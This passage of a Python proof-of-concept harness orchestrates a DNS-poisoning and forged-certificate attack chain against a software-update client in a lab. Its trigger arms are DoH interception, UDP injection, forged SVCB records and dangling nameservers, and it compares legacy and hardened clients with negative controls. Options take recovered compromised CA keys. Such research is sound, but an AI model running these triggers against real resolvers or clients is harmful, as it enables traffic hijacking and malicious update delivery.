        allowed = [kirimochi.normalize_encoding(x) for x in allow_encodings]
        if encoding not in allowed:
            update_stage.update({"decision": "ENCODING_REJECTED",
                                 "reason": "Content-Encoding %s not in %s; no decoder was invoked"
                                           % (encoding, allowed)})
            stages.append(update_stage)
            return evidence
        digest_ok = hashlib.sha256(body).hexdigest() == entry.get("sha256", "")
        ok_sig, detail = kirimochi.verify_with_openssl(body, entry.get("signature", ""),
                                                       pinned_key_pem or b"")
        update_stage["integrity"] = {"digest": digest_ok, "signature": bool(ok_sig)}
        if not pinned_key_pem or not digest_ok or not ok_sig:
            update_stage.update({"decision": "SIG_REJECTED",
                                 "reason": ("no pinned key" if not pinned_key_pem else detail or
                                            "digest/signature mismatch") +
                                           "; no decoder was invoked"})
            stages.append(update_stage)
            return evidence

    wants_decode = artifact == "br" or encoding == "br"
    if not wants_decode:
        update_stage.update({"decision": "ACCEPTED", "reason": "plain body; no decode step"})
        stages.append(update_stage)
        evidence["chain_complete"] = True
        return evidence
    try:
        if decode_hook:
            decoded = decode_hook(body)
        else:
            decoded = kirimochi.decode_brotli(body)[0]
        decode_calls[0] += 1
        update_stage["decode_calls"] = decode_calls[0]
        doc = json.loads(decoded.decode("utf-8"))
        update_stage.update({"decision": "DECODED", "marker": doc.get("artifact"),
                             "variant": doc.get("variant"), "nonce": doc.get("nonce")})
    except kirimochi.DecoderUnavailable as exc:
        update_stage.update({"decision": "INCONCLUSIVE", "reason": str(exc)})
    stages.append(update_stage)
    if update_stage.get("decision") in ("DECODED", "ACCEPTED"):
        evidence["chain_complete"] = True
    return evidence


def runtime_versions():
    decoder = None
    try:
        decoder = check_brotli.decoder_identity()
    except Exception as exc:  # pragma: no cover - informational only
        decoder = {"error": str(exc)}
    return {
        "python": sys.version.split()[0],
        "openssl": ssl.OPENSSL_VERSION,
        "brotli_decoder": decoder,
        "node": subprocess.run(["node", "--version"], capture_output=True, text=True).stdout.strip()
                if shutil.which("node") else None,
    }


def run_matrix(material, registry_dir, endpoints, target_name=TARGET_NAME, pinned_key_pem=None,
               dns_policy="follow", out_dir=None, trigger=None, crl=None):
    """The full evidence matrix: attack legs, the hardened leg, and the
    required negative controls."""
    fake = (endpoints["fake"][0], endpoints["fake"][1])
    true = (endpoints["true"][0], endpoints["true"][1])
    endpoints_by_role = {"fake": fake, "true": true}
    # Attack legs walk the active trigger arm; the negative controls pin the
    # endpoint explicitly (they control the TLS/update stages, not DNS): the
    # uncompressed body must be accepted in BOTH flavors on the same path, so
    # the rejections above come from the controls, not from breakage. N0 is the
    # trigger-arm control where the arm has one (referral: the reresolve policy
    # must reach the TRUE endpoint and complete the genuine flow).
    legs = [
        ("L1-attack-legacy", "legacy", "fake", True, dns_policy, "br"),
        ("L2-attack-hardened", "hardened", "fake", True, dns_policy, "br"),
        ("L3-legacy-tls-hardened-update", "legacy-tls-hardened-update", "fake", True, dns_policy, "br"),
    ]
    if trigger is not None and getattr(trigger, "trigger", None) == "referral":
        legs.append(("N0-reresolve-true-genuine", "legacy", "true", True, "reresolve", "br"))
    legs += [
        ("N1-true-endpoint-genuine-legacy", "legacy", "true", False, dns_policy, "br"),
        ("N2-true-endpoint-genuine-hardened", "hardened", "true", False, dns_policy, "br"),
        ("N3-plain-body-legacy", "legacy", "true", False, dns_policy, "plain"),
        ("N4-plain-body-hardened", "hardened", "true", False, dns_policy, "plain"),
    ]
    runs = []
    out_dir = Path(out_dir) if out_dir else Path(tempfile.mkdtemp(prefix="chain-evidence-"))
    out_dir.mkdir(parents=True, exist_ok=True)
    for name, flavor, role, use_trigger, policy, artifact in legs:
        evidence = run_leg(flavor, endpoints_by_role[role], target_name,
                           dns_policy=policy, artifact=artifact,
                           pinned_key_pem=pinned_key_pem,
                           compromised_meta=material["compromised_meta"],
                           crl=crl, trust_root=material["roots"],
                           endpoints_by_role=endpoints_by_role,
                           resolver=trigger if use_trigger else None)
        evidence["leg"]["name"] = name
        evidence["runtimes"] = runtime_versions()
        evidence["material"] = {"chain": material.get("material", "synthetic-stand-in"),
                                "compromised_meta": material.get("compromised_meta")}
        path = out_dir / (name + ".json")
        path.write_text(json.dumps(evidence, indent=2) + "\n")
        evidence["evidence_file"] = str(path)
        runs.append(evidence)
    summary = {"schema": "integrated-chain/1",
               "generated": datetime.now().astimezone().isoformat(timespec="seconds"),
               "target": target_name,
               "runtimes": runtime_versions(),
               "legs": [run["leg"] for run in runs],
               "runs": runs,
               "note": ("Lab only: valid Brotli lab markers, synthetic or supplied certificate "
                        "material, no exploit payload and no malformed stream. The DNS stage is a "
                        "stand-in model of measured resolver behavior; every other component is real.")}
    (out_dir / "chain-evidence.json").write_text(json.dumps(summary, indent=2) + "\n")
    return summary


def start_trigger(trigger, material, target_name=TARGET_NAME, doh_host=DOH_HOST,
                  ca_crt=None, ca_key=None, answers=None, resolver_class="pdns-docker",
                  poison_owner=None):
    """Start the services one trigger arm needs; returns (TriggerResolver, stop_fn)."""
    if trigger in ("referral", "dangling"):
        fixture = DnsFixture(mode="referral" if trigger == "referral" else "dangling")
        fixture.start()
        resolver = TriggerResolver(trigger, fixture=fixture)
        return resolver, fixture.stop
    import doh_mitm
    answer_map = doh_mitm.AnswerMap(answers or {}, default_ip=None)
    if trigger == "doh-mitm":
        # default attacker answer: the fake endpoint's virtual address; the
        # resolved value is attributed to the fake endpoint by role anyway.
        answer_map = doh_mitm.AnswerMap(answers or {target_name: [FAKE_ADDR]})
        cert = make_doh_cert(Path(material.get("work", ".")), material,
                             doh_host=doh_host, ca_crt=ca_crt, ca_key=ca_key)
        server, thread, port = doh_mitm.start_doh(cert["cert"], cert["key"], answer_map)
        resolver = TriggerResolver("doh-mitm", doh={"host": "127.0.0.1", "port": port,
                                                    "server_hostname": doh_host,
                                                    "cert_material": cert["material"]},
                                   trust_root=material["roots"],
                                   compromised_meta=material["compromised_meta"])
        resolver.doh_cert = cert
        return resolver, server.shutdown
    if trigger == "answer-inject":
        import answer_inject
        chain, stop = answer_inject.start_answer_inject(
            resolver_class=resolver_class,
            poison_owner=poison_owner or answer_inject.TARGET_NAME,
            workdir=material.get("work", "."))
        resolver = TriggerResolver("answer-inject", chain=chain)
        return resolver, stop
    if trigger == "udp-injection":
        answer_map = doh_mitm.AnswerMap(answers or {target_name: [FAKE_ADDR]})
        inject, servers, port = doh_mitm.start_udp(answer_map)
        resolver = TriggerResolver("udp-injection", udp={"host": "127.0.0.1", "port": port})
        return resolver, (lambda: doh_mitm.stop_udp(servers))
    if trigger == "svcb":
        # Trigger (e): the A answer is CORRECT (the true endpoint's address);
        # only the forged HTTPS/SVCB record points at the attacker. The
        # redirect is caused by the DNS answer alone.
        answer_map = doh_mitm.AnswerMap(
            answers or {target_name: [DnsFixture.TRUE_MARKER]},
            https_records={target_name: {"priority": 1, "target": ".",
                                         "ipv4hint": [DnsFixture.FAKE_MARKER]}})
        inject, servers, port = doh_mitm.start_udp(answer_map)
        resolver = TriggerResolver("svcb", udp={"host": "127.0.0.1", "port": port})
        return resolver, (lambda: doh_mitm.stop_udp(servers))
    raise ValueError("unknown trigger mode: " + trigger)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--flavor", choices=["legacy", "hardened", "legacy-tls-hardened-update"],
                    default="legacy")
    ap.add_argument("--trigger", choices=list(TRIGGERS), default="referral",
                    help="DNS trigger arm: referral = forged referral walked by the resolver "
                         "stand-in (a); doh-mitm = forged-CA DoH interception (b); "
                         "udp-injection = plain-UDP response injection baseline (c); "
                         "dangling = lapsed/re-registered external NS name (d); "
                         "svcb = forged HTTPS/SVCB record with the A record correct (e)")
    ap.add_argument("--resolver-class", choices=["pdns-docker", "pdns", "unbound"],
                    default="pdns-docker",
                    help="trigger (f) chain resolver: pdns-docker prefers a real PowerDNS "
                         "Recursor container and falls back to the p5-derived model; pdns and "
                         "unbound select the model class directly")
    ap.add_argument("--doh-ca-crt", help="recovered eMudhra intermediate PEM for the DoH cert "
                                         "(with --doh-ca-key enables the real issuance path)")
    ap.add_argument("--doh-ca-key", help="matching recovered key (kept outside the repository)")
    ap.add_argument("--additional-policy", choices=["follow", "reresolve"], default="follow")
    ap.add_argument("--artifact", choices=["br", "plain"], default="br")
    ap.add_argument("--name", default=TARGET_NAME, help="target hostname (SNI + Host)")
    ap.add_argument("--pinned-key", metavar="PEM", help="publisher key PEM for the hardened update policy")
    ap.add_argument("--forged-cert", "--forged-key", dest="forged", action="append", default=[],
                    help="supplied production leaf chain and key (see poc/lab/certs/README.md)")
    ap.add_argument("--trust-root", help="client trust root PEM (default: generated test root)")
    ap.add_argument("--compromised-meta", help="known-compromised issuer metadata (default: "
                                               "artifacts/impacted-intermediates.json)")
    ap.add_argument("--evidence-out", metavar="DIR", help="write evidence JSON here")
    args = ap.parse_args()

    work = Path(tempfile.mkdtemp(prefix="chain-demo-"))
    material = build_synthetic_material(work, args.name)
    material["work"] = str(work)
    if args.trust_root:
        # Bundle: the supplied root (e.g. the public eMudhra root for real
        # material) plus the synthetic test root so the ordinary-chain control
        # legs keep working - a platform trust store holds many roots.
        bundle = work / "trust-roots.pem"
        bundle.write_bytes(Path(args.trust_root).read_bytes().strip() + b"\n" +
                           Path(material["roots"]).read_bytes().strip() + b"\n")
        material["roots"] = str(bundle)
    if args.compromised_meta:
        material["compromised_meta"] = args.compromised_meta
    if len(args.forged) == 2:
        material["forged"] = tuple(args.forged)
        material["material"] = "supplied"
    registry = mock_registry.Registry()
    stop_trigger = None
    try:
        registry_dir = work / "registry"
        mock_registry.export_registry(registry, str(registry_dir))
        pinned = Path(args.pinned_key).read_bytes() if args.pinned_key else registry.public_key
        trigger_resolver, stop_trigger = start_trigger(
            args.trigger, material, target_name=args.name,
            ca_crt=args.doh_ca_crt, ca_key=args.doh_ca_key,
            resolver_class=args.resolver_class)
        endpoints = start_endpoints(material, str(registry_dir), target_name=args.name,
                                    log_dir=work / "logs")
        try:
            summary = run_matrix(material, str(registry_dir), endpoints, target_name=args.name,
                                 pinned_key_pem=pinned, dns_policy=args.additional_policy,
                                 out_dir=args.evidence_out, trigger=trigger_resolver)
        finally:
            stop_endpoints(endpoints)
    finally:
        if stop_trigger:
            stop_trigger()
        registry.tmp.cleanup()
    for run in summary["runs"]:
        markers = " -> ".join("%s:%s" % (stage["stage"], stage.get("decision", stage.get("status")))
                              for stage in run["stages"])
        print("%-32s %s" % (run["leg"]["name"], markers))
    print(json.dumps({"evidence": str(Path(summary["runs"][0]["evidence_file"]).parent /
                                      "chain-evidence.json")}, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
